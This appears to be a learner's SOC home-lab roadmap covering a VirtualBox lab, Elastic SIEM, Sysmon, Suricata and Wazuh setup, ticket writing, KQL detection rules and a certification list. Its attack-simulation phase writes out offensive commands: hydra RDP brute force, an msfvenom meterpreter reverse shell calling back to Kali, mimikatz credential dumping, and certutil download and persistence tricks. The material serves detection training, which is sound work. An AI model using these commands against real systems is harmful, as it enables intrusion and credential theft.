01
Set Up Your Virtual Lab Environment
VirtualBox or UTM · 3 VMs · isolated network · ~3 hours
VirtualBoxUbuntu ServerKali LinuxWindows 10Networking
▶
Your lab is the foundation for everything else. You need 3 virtual machines — one as your SIEM (Ubuntu), one as your victim endpoint (Windows), and one as your attacker (Kali). They need to communicate with each other but be isolated from your real network.
1
Install your hypervisor
Windows or Intel Mac: download VirtualBox and the Extension Pack from the same page. Apple Silicon Mac (M1/M2/M3): download UTM instead — VirtualBox does not work on Apple Silicon.
VirtualBoxUTM (Mac only)
2
Download your 3 OS images
Ubuntu Server 22.04 LTS → your SIEM host
Kali Linux → your attacker node (use Virtual Machine pre-built image)
Windows 10 Enterprise Evaluation → free 90-day trial, your victim endpoint

Apple Silicon Mac users: download the ARM64 versions of Ubuntu and the Apple Silicon Kali image. Windows installs via UTM Gallery automatically.
3
Create your 3 VMs with these specs
SIEM-Ubuntu: 4–6GB RAM, 50GB storage, 2 CPUs
WIN10-Victim: 4–6GB RAM, 60GB storage, 2 CPUs
Kali-Attacker: 2–4GB RAM, 40GB storage, 2 CPUs

Install each OS. Ubuntu: username socadmin, enable OpenSSH. Windows: skip Microsoft account, create local user. Kali: default login is kali/kali — change password immediately.
If you have 16GB RAM: run 2 VMs at a time max. If you have 32GB: run all 3 simultaneously.
4
Configure isolated networking
In VirtualBox: each VM → Settings → Network → set to Host-Only Adapter. Give Kali a second adapter set to NAT so it can reach the internet for tool downloads. Boot each VM and confirm they can ping each other. This keeps your attack simulations off your real home network.
VirtualBox Network ManagerHost-Only AdapterNAT
PHASE GOALAll 3 VMs boot and can ping each other. You're ready to build your detection stack on top.
02
Deploy Elastic SIEM + Suricata IDS
Elastic 8 · Kibana · Sysmon · Suricata · Fleet · ~4 hours
ElasticsearchKibanaSysmonSuricataFleetDashboards
▶
Elastic SIEM is your detection engine — every alert flows through here. Sysmon gives you deep Windows endpoint telemetry. Suricata gives you network-level detection. Together they cover both host and network visibility.
1
Install Elasticsearch and Kibana on Ubuntu
SSH into your Ubuntu VM and run these commands one at a time:
sudo apt update && sudo apt upgrade -y
wget -qO - https://artifacts.elastic.co/GPG-KEY-elasticsearch | sudo apt-key add -
sudo apt install apt-transport-https -y
echo 'deb https://artifacts.elastic.co/packages/8.x/apt stable main' | sudo tee /etc/apt/sources.list.d/elastic-8.x.list
sudo apt update && sudo apt install elasticsearch kibana -y
sudo systemctl enable --now elasticsearch kibana
Then reset the elastic password: sudo /usr/share/elasticsearch/bin/elasticsearch-reset-password -u elastic — save this password. Open your browser and go to http://[ubuntu-ip]:5601 — Kibana should load.
2
Install Sysmon on Windows 10 with SwiftOnSecurity config
On your Windows VM: download Sysmon from Microsoft Sysinternals. Download the SwiftOnSecurity config — this is a community-maintained best-practice Sysmon configuration. Open PowerShell as Administrator and run: .\\Sysmon64.exe -accepteula -i sysmonconfig-export.xml. Sysmon now logs all process creation, network connections, file writes, and registry changes.
SysmonSwiftOnSecurity configPowerShell
3
Connect Windows to Elastic via Fleet
In Kibana: go to Fleet → Add Agent → copy the PowerShell install command shown on screen. Run that command in your Windows VM PowerShell. Wait 60 seconds — the agent appears in Fleet. Click it → enable the Windows integration and Sysmon integration. Go to Kibana → Discover and confirm logs are flowing. You should see Event IDs 4624, 4625, 4688, 4698 and Sysmon events 1, 3, 10, 11, 13.
4
Install Suricata IDS on Ubuntu
On Ubuntu: sudo apt install suricata -y then sudo suricata-update to download the latest ET Open threat rules. Edit the config to set your network interface: sudo nano /etc/suricata/suricata.yaml. Start it: sudo systemctl enable --now suricata. Test: from Kali run nmap [ubuntu-ip] and check sudo tail -f /var/log/suricata/fast.log — you should see the scan alert. Install Filebeat to forward Suricata logs to Elastic: sudo apt install filebeat → enable suricata module → connect to Elasticsearch.
SuricataET Open RulesFilebeat
5
Build 5 Kibana detection dashboards
In Kibana → Analytics → Dashboards → Create. Build these 5 dashboards using KQL filters:
1. Authentication — Event ID 4624 (logins) and 4625 (failed logins) over time
2. Process Activity — top processes created, PowerShell executions, encoded commands
3. Network — top destination IPs and ports, unusual outbound connections
4. IDS Alerts — Suricata alerts by severity and category
5. Persistence — scheduled tasks (4698), services installed (7045), registry changes (Sysmon 13)
These are what a real SOC analyst checks at the start of every shift.
PHASE GOALWindows and Sysmon logs flow into Kibana. Suricata alerts appear. 5 dashboards built. Your SIEM is live.

Wazuh XDR — Second Detection Platform
Open-source EDR/XDR/SIEM · agents · FIM · ATT&CK mapping · ~3 hours
WazuhXDREDR AgentFIMVulnerability Detection
▶
Why this matters: Elastic SIEM taught you log ingestion and detection. Wazuh teaches you the EDR agent-to-manager-to-console workflow used by enterprise EDR tools like CrowdStrike and SentinelOne. Understanding this pattern means you can learn any EDR in your first week on the job. It is also one of the most used open-source security platforms at real companies.
1
Install Wazuh all-in-one on Ubuntu
On your Ubuntu SIEM VM run the Wazuh quick-start installer: curl -sO https://packages.wazuh.com/4.x/wazuh-install.sh && sudo bash wazuh-install.sh -a. This installs the Wazuh Manager, Wazuh Indexer, and Wazuh Dashboard in a single command. Access the web UI at https://[ubuntu-ip] using the credentials printed at the end of the installer. Note: it is resource-heavy — run it with Elastic shut down or use a separate VM if RAM allows.
Wazuh ManagerWazuh Dashboard
2
Deploy Wazuh agents on Windows and Ubuntu
In the Wazuh dashboard go to Agents → Deploy New Agent. Follow the Windows PowerShell install command for your Windows VM and the Linux command for your Ubuntu VM. This is the same workflow used to onboard endpoints in CrowdStrike, SentinelOne, and MDE — a command deployed via script or GPO that registers the endpoint with the central manager. Confirm both agents show Active in the dashboard.
Wazuh AgentPowerShellAgent Enrollment
3
Explore alerts, FIM, and vulnerability detection
Generate activity on your Windows VM and review what Wazuh captures. Explore three key modules:
→ Alerts: navigate the Threat Hunting dashboard — review detected events, rule IDs, and severity levels
→ File Integrity Monitoring (FIM): create, modify, and delete a file in a monitored directory — watch Wazuh alert on the change. This is how EDRs detect file system tampering and malware dropping payloads.
→ Vulnerability Detection: enable the vulnerability-detector module and run a scan — review CVEs found on your Windows host
FIMVulnerability DetectorWazuh Rules
4
View the built-in MITRE ATT&CK mapping
Navigate to Wazuh → Modules → MITRE ATT&CK. Wazuh automatically maps its detection rules to ATT&CK techniques. Run a few attack simulations from Kali and see how they appear in the ATT&CK heatmap. Compare this to your Elastic SIEM workflow. This is exactly what real SOC teams use to measure detection coverage and prioritize rule development.
5
Write a Wazuh vs Elastic comparison document
Document the differences and similarities between Wazuh and Elastic SIEM: data ingestion, agent model, alerting, threat hunting, ATT&CK coverage, dashboard usability, and use cases. Publish to GitHub. Being able to compare two SIEM/XDR platforms fluently in an interview is a strong signal of real depth — most candidates can only speak to one.
INTERVIEW TRANSLATION

"My lab runs both Elastic SIEM and Wazuh XDR. Wazuh taught me the EDR agent enrollment, FIM alerting, and MITRE ATT&CK coverage mapping workflows that translate directly to CrowdStrike and SentinelOne. I documented a comparison of both platforms covering ingestion, alerting, and threat hunting workflows."

Standard ticket format · escalation notes · 5 full reports · ~3 hours
SOC L1 CoreTicket WritingIncident ReportsEscalation
▶
Why this matters: SOC analysts are judged on two things — technical ability and communication. A brilliant investigation documented poorly gets ignored. Master the ticket format used in real SOCs and you walk into any L1 role ready to contribute from day one.
1
Master the standard SOC ticket format
Every ticket must include: Alert Name · Severity · Host · User · Source IP · Dest IP · Timestamp · Detection Source · Summary · Evidence (log excerpts + screenshots) · Timeline · Analysis · MITRE ATT&CK · Verdict (TP/FP/Benign/Escalate) · Escalation Decision · Recommended Action. Save this as a template in your GitHub repo.
2
Write 5 tickets from your Phase 3 investigations
Take your failed login, suspicious PowerShell, parent-child process, new user, and admin group investigations and document each using the full ticket template. Cite exact Event IDs, timestamps, usernames, and hosts. Be specific — real managers will read these.
3
Write 3 escalation summaries
For 3 investigations, write a 2-3 sentence escalation note — what you'd send your L2. Include: what was observed, what you did to investigate, why you're escalating, what you need them to do. Concise and clear. This is one of the most asked-about skills in L1 interviews.
4
Write 1 full incident report
Pick your strongest Phase 3 investigation. Write a complete report: Executive Summary (non-technical), Technical Findings, Timeline, Evidence with screenshots, MITRE mapping, Containment Recommendation, Lessons Learned. Publish to GitHub. This is your anchor portfolio piece.
5
Practice explaining a ticket out loud
Pick one ticket and present it out loud in 2-3 minutes as if briefing your manager or in a live interview. Record yourself. Cover: what the alert was, what you investigated, what you found, what you recommended. This directly prepares you for "walk me through an alert you've triaged."

Attack Simulation + Alert Triage
8 attack types · KQL detection rules · 7 runbooks · ~6 hours
MetasploitmimikatzKQL RulesSigmaRunbooksPICERL
▶
This phase is the core of what L1 SOC analysts do every day — receive an alert, investigate it, decide what it is, document it, and close it or escalate. You generate real attacks and triage the real alerts they produce.
1
Run 8 attack scenarios and triage each alert in Kibana
1. Port scan: nmap -sV -sC [win-ip] → find in Sysmon Event 3 + Suricata
2. RDP brute force: hydra -l administrator -P /usr/share/wordlists/rockyou.txt rdp://[win-ip] → Event 4625 spike
3. Reverse shell: msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=[kali] LPORT=4444 -f exe > shell.exe → transfer to Windows → run → Sysmon 1 and 3
4. Encoded PowerShell: on Windows: powershell -enc [base64] → Sysmon Event 1 with -enc in args
5. Credential dump: run mimikatz sekurlsa::logonpasswords → Sysmon Event 10 (LSASS access)
6. Scheduled task: schtasks /create /tn Updater /tr calc.exe /sc onlogon → Event 4698
7. Registry persistence: reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Update /d calc.exe → Sysmon 13
8. LOLBin abuse: certutil.exe -urlcache -split -f http://[kali]:8000/test.txt test.txt → Sysmon 1

For EVERY attack: write a triage note — what fired, what host, what user, is this a true positive, what ATT&CK technique.
MetasploitHydramimikatzKibana KQL
2
Write 7 custom KQL detection rules in Elastic
In Kibana → Security → Rules → Create Rule. Build these:
1. LSASS Access: winlog.event_data.TargetImage: *lsass.exe AND NOT process.name: (MsMpEng.exe) → Critical
2. Encoded PowerShell: process.name: powershell.exe AND process.command_line: *-enc* → High
3. Certutil Download: process.name: certutil.exe AND process.command_line: *urlcache* → High
4. Scheduled Task Created: event.code: 4698 → Medium
5. RDP Brute Force: event.code: 4625 AND winlog.event_data.LogonType: 10 threshold 10/60s → High
6. New Admin Added: event.code: 4732 AND group.name: Administrators → Critical
7. WMI Execution: process.parent.name: WmiPrvSE.exe AND process.name: (cmd.exe OR powershell.exe) → High
Test each rule by running the matching attack. Confirm it fires.
3
Write a runbook for each of these 7 alert types
A runbook is a step-by-step decision guide for handling a specific alert. Write one for: Brute Force, Malware Execution, Phishing, Privilege Escalation, C2 Beaconing, LSASS Access, Lateral Movement. Each runbook should define: what triggered it → what to check in order → IOC lookups to run → when to escalate → when to close. Save all 7 as Markdown files in your GitHub repo.

Write PICERL incident reports for every attack
For each of your 8 attack simulations, write a full incident report using the PICERL framework:

Each report should include: timeline, ATT&CK technique, IOC table, containment steps, and remediation. These become your portfolio. Publish all of them to GitHub.

02 — Certifications

Which Certs Actually Matter

Focus on these. In this order. Don't get distracted by expensive or irrelevant certs.

CompTIA Security+
✓ EARNED
The baseline for every SOC and security analyst role. Required on most job postings and a DoD 8570/8140 requirement for government and defense positions.
CompTIA Network+
✓ EARNED
TCP/IP, DNS, VPNs, firewalls — the networking foundation you need to analyze alerts and investigate traffic in any SOC environment.
CompTIA CySA+
✓ EARNED
The most SOC-specific CompTIA cert. Covers threat detection, SIEM analysis, incident response, and vulnerability management. Filtered for by MSSP ATS systems.
AWS Security Specialty
IN PROGRESS
The highest-level AWS security certification. Covers GuardDuty, CloudTrail, Security Hub, IAM, and cloud incident response. Major differentiator for cloud-adjacent SOC and security analyst roles.
CompTIA A+
WGU — IN PROGRESS
Hardware, OS, troubleshooting, and IT operations fundamentals. Required as part of the WGU B.S. Cybersecurity & Information Assurance degree program.
CompTIA Linux+
WGU — IN PROGRESS
Linux administration, shell scripting, and security hardening on Linux systems. Critical for SOC work — most SIEM servers, EDR tools, and cloud workloads run Linux.
CompTIA Data+
WGU — IN PROGRESS
Data analytics, visualization, and reporting fundamentals. Supports security data analysis, SIEM dashboard work, and threat intelligence reporting skills.
CompTIA PenTest+
WGU — IN PROGRESS
Penetration testing methodology, vulnerability scanning, and ethical hacking. Understanding attacker techniques makes you a stronger defender — essential for L2 SOC and threat hunting roles.
CCSP — (ISC)²
LONG-TERM GOAL
Certified Cloud Security Professional — the gold standard for cloud security engineering roles. Targets the $120K+ Cloud Security Engineer positions. Get this after 2+ years of cloud security experience.
WGU BSCSIA
JAN 2027
Bachelor of Science in Cybersecurity and Information Assurance — Western Governors University. Includes 16 industry certifications built directly into the curriculum. ABET-accredited. NSA/DHS designated National Center of Academic Excellence in Cyber Defense.
